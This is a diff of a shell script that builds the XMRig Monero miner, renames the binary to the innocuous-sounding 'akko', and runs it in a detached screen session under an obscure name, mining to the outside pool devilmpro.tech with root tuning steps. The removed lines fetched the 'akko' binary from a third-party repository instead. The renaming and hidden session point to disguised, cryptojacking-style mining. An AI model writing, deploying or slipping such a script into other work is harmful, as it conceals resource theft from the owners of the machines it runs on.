@@ -5,12 +5,14 @@ sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-de
 sudo modprobe msr
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
 sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
-sudo chmod +x enable_1gb_pages.sh
-sudo chmod +x randomx_boost.sh
-sudo bash enable_1gb_pages.sh
-sudo bash randomx_boost.sh
-sudo wget https://raw.githubusercontent.com/deepmonero/akko/main/akko
-sudo chmod +x akko
+sudo chmod +x *.sh
+./enable_1gb_pages.sh
+./randomx_boost.sh
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/build
+cmake ..
+make -j$(nproc)
+mv xmrig akko
 screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
 sudo pkill akko
 screen -dmS p4rs37 ./akko  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
